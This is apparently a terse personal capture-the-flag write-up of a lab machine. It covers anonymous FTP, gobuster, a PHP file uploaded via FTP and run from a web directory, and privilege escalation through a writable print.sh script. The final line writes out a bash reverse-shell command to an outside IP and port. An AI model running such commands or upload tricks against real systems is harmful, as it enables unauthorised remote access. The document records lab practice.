- FTP Anonymous login allowed

2.) gobuster like a boss for those hidden directories

- i went on a circle run since i thought that Maya would be a user, and used Hydra, wasted my time.

3.) FTP into anonymous.

- i see that ftp has the same files as the url /files, so correctly thought to use some sort of injection, like PHP injection.
- and back in my nmap scan, it showed how the privleges are with /ftp as a directory

- added the php file to ftp now i will go to the /files url and click on the file

4.) now after finding the recipe, get into or find user.txt through privlege escalation.
-

- found my privleges within this file
- since i can edit and write on print.sh, need some sort of bash injection or exploit 
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/8a66baca-6fed-425d-95b5-ec407ea67e4d)
- bash -i >& /dev/tcp/10.2.107.89/9999 0>&1
